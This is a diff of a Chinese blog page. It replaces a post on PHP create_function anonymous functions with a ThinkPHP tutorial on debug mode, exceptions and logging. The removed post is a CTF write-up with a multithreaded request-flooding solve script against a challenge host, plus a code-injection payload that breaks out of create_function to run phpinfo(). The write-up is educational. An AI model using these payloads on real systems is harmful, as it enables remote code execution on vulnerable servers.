@@ -15,21 +15,20 @@
 
 
 
-<meta name="description" content="前言： 在招新群里看有学弟问一道CTF的题，没见过，去了解了一下，又学到了新知识——PHP隐匿函数">
+<meta name="description" content="前言 ThinkPHP框架的学习快要结束了，今天主要看调试部分">
 <meta name="keywords" content="学习笔记,PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP匿名函数">
-<meta property="og:url" content="http://yoursite.com/2018/07/25/PHP-Anony/index.html">
+<meta property="og:title" content="ThinkPHP框架学习--调试">
+<meta property="og:url" content="http://yoursite.com/2018/08/20/ThinkPHP10/index.html">
 <meta property="og:site_name" content="Double--R blog">
-<meta property="og:description" content="前言： 在招新群里看有学弟问一道CTF的题，没见过，去了解了一下，又学到了新知识——PHP隐匿函数">
+<meta property="og:description" content="前言 ThinkPHP框架的学习快要结束了，今天主要看调试部分">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/27.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP%E9%9A%90%E5%8C%BF%E5%87%BD%E6%95%B0%E7%BB%93%E6%9E%9C.jpg">
-<meta property="og:updated_time" content="2018-08-10T04:47:57.219Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/4.jpg">
+<meta property="og:updated_time" content="2018-08-20T06:46:02.868Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP匿名函数">
-<meta name="twitter:description" content="前言： 在招新群里看有学弟问一道CTF的题，没见过，去了解了一下，又学到了新知识——PHP隐匿函数">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/27.jpg">
+<meta name="twitter:title" content="ThinkPHP框架学习--调试">
+<meta name="twitter:description" content="前言 ThinkPHP框架的学习快要结束了，今天主要看调试部分">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/4.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -61,7 +60,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>PHP匿名函数 | Double--R blog</title>
+<title>ThinkPHP框架学习--调试 | Double--R blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -291,11 +290,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-PHP-Anony" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ThinkPHP10" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/07/25/PHP-Anony/" class="article-date">
-      <time datetime="2018-07-25T02:39:59.000Z" itemprop="datePublished">2018-07-25</time>
+      <a href="/2018/08/20/ThinkPHP10/" class="article-date">
+      <time datetime="2018-08-20T04:53:54.000Z" itemprop="datePublished">2018-08-20</time>
 </a>
 
 
@@ -310,7 +309,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      PHP匿名函数
+      ThinkPHP框架学习--调试
     </h1>
   
 
@@ -319,7 +318,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">889字</span>
+			<span class="post-count">659字</span>
 		</span>
 	</span>
 	
@@ -328,7 +327,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-hourglass-half"></i>
 			<span class="post-meta-item-text"> 阅读时长: </span>
-			<span class="post-count">4分</span>
+			<span class="post-count">2分</span>
 		</span>
 	</span>
 </div>
@@ -351,36 +350,62 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><strong>前言：</strong></p>
-<p>在招新群里看有学弟问一道CTF的题，没见过，去了解了一下，又学到了新知识——PHP隐匿函数</p>
+        <p><strong>前言</strong></p>
+<p>ThinkPHP框架的学习快要结束了，今天主要看调试部分</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/27.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/4.jpg" alt=""></p>
 <a id="more"></a>
-<h2 id="什么是匿名函数"><a href="#什么是匿名函数" class="headerlink" title="什么是匿名函数"></a>什么是匿名函数</h2><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>匿名函数（Anonymous functions），也叫闭包函数（closures），允许 临时创建一个没有指定名称的函数。 在PHP中有一个函数create_function可以用来创建匿名函数。具体用法：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = create_function(string $args , string $code)</span><br><span class="line"><span class="comment">//string $args 变量部分，string $code 方法代码部分</span></span><br></pre></td></tr></table></figure>
-<p>举个例子：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$fname'</span>,<span class="string">'echo $fname."aaa"'</span>)</span><br><span class="line"><span class="comment">//类似于</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ft</span><span class="params">($fname)</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> $fname.<span class="string">"aaa"</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<p>匿名函数也是有名字的，名字是%00lambda_%d，其中%d代表该匿名函数是当前进程中的第几个匿名函数。</p>
-<h2 id="来看一下题目"><a href="#来看一下题目" class="headerlink" title="来看一下题目"></a>来看一下题目</h2><p>这是一道南邮的新CTF题，来源是SUCTF的一道WEB题，起源于hitcon2017。</p>
-<h3 id="首先来看一下源代码"><a href="#首先来看一下源代码" class="headerlink" title="首先来看一下源代码"></a>首先来看一下源代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-<h3 id="分析一下"><a href="#分析一下" class="headerlink" title="分析一下"></a>分析一下</h3><p>首先$my是一个创建匿名函数的字符串，匿名函数的作用就是输出flag.php的内容</p>
-<p>其次定义$hash为一个随机生成字符串。</p>
-<p>然后eval函数执行由SUCTF_$hash()组成随机名字的函数，用于生成一个匿名函数。</p>
-<p>最后，我们的可控点就是可以GET传参进去一个函数名。</p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>所以我们的思路是我们传一个匿名函数函数名进去，如果刚好是它生成的匿名函数的函数名，我们就可以</p>
-<p>执行die函数输出flag。但是我们并不知道目前它是第几个线程，所以无法确定他的函数名。但是每个进程的匿名函数也是有数量限制的，当匿名函数的数值超过限制时，匿名函数会从1开始重新生成。所以我们只要设置传入的函数名为%00lambda_1，然后不断的请求，知道它进程中的匿名函数名满重新回到1时，就能获得Flag。</p>
-<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(a,b):</span><br><span class="line">        url1 = <span class="string">"http://45.76.173.177:23334/?func_name=%00lambda_1"</span></span><br><span class="line">        s = requests.get(url1)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"["</span>+str(i)+<span class="string">"]"</span>+s.content</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">thread.start_new_thread(getflag,(<span class="number">1</span>,<span class="number">300</span>))</span><br><span class="line">thread.start_new_thread(getflag,(<span class="number">300</span>,<span class="number">600</span>))</span><br><span class="line">thread.start_new_thread(getflag,(<span class="number">600</span>,<span class="number">900</span>))</span><br><span class="line">thread.start_new_thread(getflag,(<span class="number">900</span>,<span class="number">1200</span>))</span><br><span class="line">thread.start_new_thread(getflag,(<span class="number">1200</span>,<span class="number">1500</span>))</span><br><span class="line">thread.start_new_thread(getflag,(<span class="number">1500</span>,<span class="number">2000</span>))</span><br><span class="line">thread.start_new_thread(getflag,(<span class="number">2000</span>,<span class="number">2300</span>))</span><br><span class="line">thread.start_new_thread(getflag,(<span class="number">2300</span>,<span class="number">2600</span>))</span><br></pre></td></tr></table></figure>
-<p>为了减少时间，我们用python开多个线程去跑</p>
-<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP%E9%9A%90%E5%8C%BF%E5%87%BD%E6%95%B0%E7%BB%93%E6%9E%9C.jpg" alt=""></p>
-<h2 id="实际危害"><a href="#实际危害" class="headerlink" title="实际危害"></a>实际危害</h2><p>上面的题目知识考察对匿名函数的了解，并没有体现匿名函数可能存在的危害。实际上当我们使用create_function创建匿名函数时可能会存在代码注入的危害。</p>
-<h3 id="问题代码："><a href="#问题代码：" class="headerlink" title="问题代码："></a>问题代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	$str = <span class="string">'echo '</span>.$a.<span class="string">'test'</span>.$id.<span class="string">';'</span>;</span><br><span class="line">	$f1 = create_function(<span class="string">'$a'</span>,$str);</span><br></pre></td></tr></table></figure>
-<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>这段代码接收一个参数id，并把id的值与其它语句拼接成一个php代码的字符串，然后使用create_function函数创建一个匿名函数。</p>
-<h3 id="原先效果"><a href="#原先效果" class="headerlink" title="原先效果"></a>原先效果</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">functionf1($a)&#123;</span><br><span class="line">	<span class="keyword">echo</span> $a.<span class="string">'test'</span>.$id;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于这个id参数是可控的，所以就存在被注入的危害。当传入的id参数为<code>2;}phpinfo();/*</code>时，原有效果就改变 了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ft</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $a.<span class="string">'test'</span>.<span class="string">'2'</span>;</span><br><span class="line">&#125;phpinfo();<span class="comment">/*&#125;</span></span><br></pre></td></tr></table></figure>
-<p>这是我们就在源代码中插入了我们的函数，漏洞就就被利用了</p>
 <hr>
-<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=461525011&auto=1&height=66"></iframe></div>
+<h2 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h2><p>调试模式的开启与关闭都遭入口文件中通过定义常量”APP_DEBUG”来进行操作。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开启调试模式</span></span><br><span class="line">define(<span class="string">'APP_DEBUG'</span>,<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//关闭调试模式</span></span><br><span class="line">define(<span class="string">'APP_DEBUG'</span>,flase);</span><br></pre></td></tr></table></figure>
+<p>开启调试模式后会有以下变化：</p>
+<ul>
+<li>日志记录，任何错误和调试信息会进行记录</li>
+<li>关闭模板缓存</li>
+<li>记录SQL日志</li>
+<li>关闭数据库字段缓存</li>
+<li>文件大小写敏感</li>
+<li>开启页面trace</li>
+</ul>
+<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>ThinkPHP在程序发生异常的时候不仅显示错误信息，还会将trace信息显示出来便于查错。如果关闭调试模式，则只会输出错误信息。</p>
+<p>如果在业务逻辑处理的时候需要手动抛出异常，可以使用ThinkPHP自带的”E”函数进行处理，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>ThinkPHP自带的异常显示模板路劲为”ThinkPHP/Tpl/think_exception.tpl”，可以通过配置”TMP_EXCEPTION_FILE”来修改。</p>
+<p>以下为异常模板文件中可以使用的变量：</p>
+<ul>
+<li>$e[‘file’]：发生异常的文件名</li>
+<li>$e[‘line’]：发生异常的行数</li>
+<li>$e[‘message’]：异常信息</li>
+<li>$e[‘trace’]：异常trace信息</li>
+</ul>
+<p>抛出异常后会显示具体的异常信息（trace的显示取决于是否是调试模式），如果想在出现异常时统一显示，可以使用如下配置：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'SHOW_ERROR_MSG'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line"><span class="string">'ERROR_MESSAGE'</span> =&gt; <span class="string">'发生错误，请刷新'</span></span><br></pre></td></tr></table></figure>
+<p>使用此操作后，页面不会显示异常信息，但日志依旧会记录异常信息。</p>
+<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>在程序开发过程中，往往需要使用持久化日志记录功能。ThinkPHP内置了日志系统，需要做的仅仅是配置。如下是一个典型的日志配置：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'LOG_RECORDED'</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line"><span class="string">'LOG_LEVEL'</span> =&gt; <span class="string">'EMERG,ALERT,CRIT,ERR'</span></span><br></pre></td></tr></table></figure>
+<p><strong>日志级别：</strong></p>
+<ul>
+<li>EMERG：严重错误，出现错误时程序无法运行</li>
+<li>ALERT：警戒性错误，必须立即被修正</li>
+<li>CRIT：临界值错误，超过临界值的错误</li>
+<li>ERR：一般错误</li>
+<li>WARN：警告错误</li>
+<li>NOTIC：通知级别错误</li>
+<li>INFO：信息级别</li>
+<li>DEBUG：调试输出</li>
+<li>SQL：SQL语句，调试模式下有效</li>
+</ul>
+<p><strong>记录方式：</strong></p>
+<p>目前支持File、Sae，有需要可以自行修改”LOG_TYPE”配置自行扩展</p>
+<p><strong>写入日志：</strong></p>
+<p>ThinkPHP的Log类提供record和write方法记录日志</p>
+<p>record方法原型如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">record($message,$level=<span class="keyword">self</span>::ERR,$record=<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure>
+<p>$level为日志级别，如果”LOG_LEVEL”不包括当前$level，那么系统不记录该日志，需要强制记录，请将$record设置为”true”。</p>
+<p>write方法原型如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write($message,$level=<span class="keyword">self</span>::ERR,$type=<span class="string">''</span>,$destination=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+<hr>
+<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=526464145&auto=1&height=66"></iframe></div>
       
     </div>
     
@@ -388,13 +413,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/07/25/PHP-Anony/">PHP匿名函数</a></p>
+        <p><span>本文标题:</span><a href="/2018/08/20/ThinkPHP10/">ThinkPHP框架学习--调试</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-07-25, 10:39:59</p>
-        <p><span>最后更新:</span>2018-08-10, 12:47:57</p>
+        <p><span>发布时间:</span>2018-08-20, 12:53:54</p>
+        <p><span>最后更新:</span>2018-08-20, 14:46:02</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/07/25/PHP-Anony/" title="PHP匿名函数">http://yoursite.com/2018/07/25/PHP-Anony/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/07/25/PHP-Anony/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/08/20/ThinkPHP10/" title="ThinkPHP框架学习--调试">http://yoursite.com/2018/08/20/ThinkPHP10/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/08/20/ThinkPHP10/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -406,16 +431,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/07/26/ThinkPHP1/">
-                    ThinkPHP框架学习--配置
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/06/12/Hash-Length-Extension-Attacks/">
-                    哈希长度扩展攻击
+                <a href="/2018/08/12/ThinkPHP9/">
+                    ThinkPHP框架学习--模板（二）
                 </a>
             </div>
         
@@ -427,7 +446,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是匿名函数"><span class="toc-number">1.</span> <span class="toc-text">什么是匿名函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#匿名函数"><span class="toc-number">1.1.</span> <span class="toc-text">匿名函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#来看一下题目"><span class="toc-number">2.</span> <span class="toc-text">来看一下题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#首先来看一下源代码"><span class="toc-number">2.1.</span> <span class="toc-text">首先来看一下源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析一下"><span class="toc-number">2.2.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题思路"><span class="toc-number">2.3.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题脚本"><span class="toc-number">2.4.</span> <span class="toc-text">解题脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#结果"><span class="toc-number">2.5.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实际危害"><span class="toc-number">3.</span> <span class="toc-text">实际危害</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#问题代码："><span class="toc-number">3.1.</span> <span class="toc-text">问题代码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码分析"><span class="toc-number">3.2.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原先效果"><span class="toc-number">3.3.</span> <span class="toc-text">原先效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#调试模式"><span class="toc-number">1.</span> <span class="toc-text">调试模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#异常处理"><span class="toc-number">2.</span> <span class="toc-text">异常处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#日志"><span class="toc-number">3.</span> <span class="toc-text">日志</span></a></li></ol>
         
     </div>
     <style>
@@ -463,7 +482,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"PHP匿名函数　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"ThinkPHP框架学习--调试　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -483,15 +502,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/07/26/ThinkPHP1/" title="上一篇: ThinkPHP框架学习--配置">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/06/12/Hash-Length-Extension-Attacks/" title="下一篇: 哈希长度扩展攻击">
+            <a href="/2018/08/12/ThinkPHP9/" title="下一篇: ThinkPHP框架学习--模板（二）">
                 <i class="fa fa-angle-right"></i>
             </a>
         
